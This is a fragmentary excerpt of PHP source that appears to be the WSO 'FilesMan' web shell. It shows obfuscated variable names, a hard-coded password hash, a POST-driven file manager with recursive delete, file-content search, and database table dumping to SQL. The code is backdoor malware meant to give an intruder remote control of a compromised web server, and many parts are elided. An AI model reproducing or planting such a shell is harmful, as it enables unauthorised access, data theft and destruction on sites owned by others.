<?php
$› = "97d4a61eb2534af88986c41853ceecb6";
$˜ = true;
$œ = 'UTF-8';
$š = 'FilesMan';
...
<input type=hidden name=charset>
	...
	$opt_charsets = '';
	foreach($charsets as $Ÿ)
		$opt_charsets .= '<option value="'.$Ÿ.'" '.($_POST['charset']==$Ÿ?'selected':'').'>'.$Ÿ.'</option>';
		...
		switch($_POST['p1']) {
			...
			case 'delete':
				function deleteDir($path) {
					...
					$dh  = opendir($path);
					while ( ($Ÿ = readdir($dh) ) !== false) {
						$Ÿ = $path.$Ÿ;
						if ( (basename($Ÿ) == "..") || (basename($Ÿ) == ".") )
							continue;
						$type = filetype($Ÿ);
						if ($type == "dir")
							deleteDir($Ÿ);
		...
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $Ÿ) {
				if(@is_dir($Ÿ)){
					...
					if(empty($_POST['p2']) || @strpos(file_get_contents($Ÿ), $_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($Ÿ)."\", \"view\",\"\")'>".htmlspecialchars($Ÿ)."</a><br>";
				}
			}
		}
	}
			...
			switch($this->type)	{
					...
					while($Ÿ = $this->fetch()) {
						...
						foreach($Ÿ as $k=>$v) {
                            ...
                            elseif(is_int($v))
                                ...
                                $Ÿ[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
				...
				case 'pgsql':
					...
					while($Ÿ = $this->fetch()) {
                        ...
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $Ÿ).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
...
if( empty($_POST['a']) )
	if(isset($š) && function_exists('action' . $š))
		$_POST['a'] = $š;
	else
		$_POST['a'] = 'FilesMan';
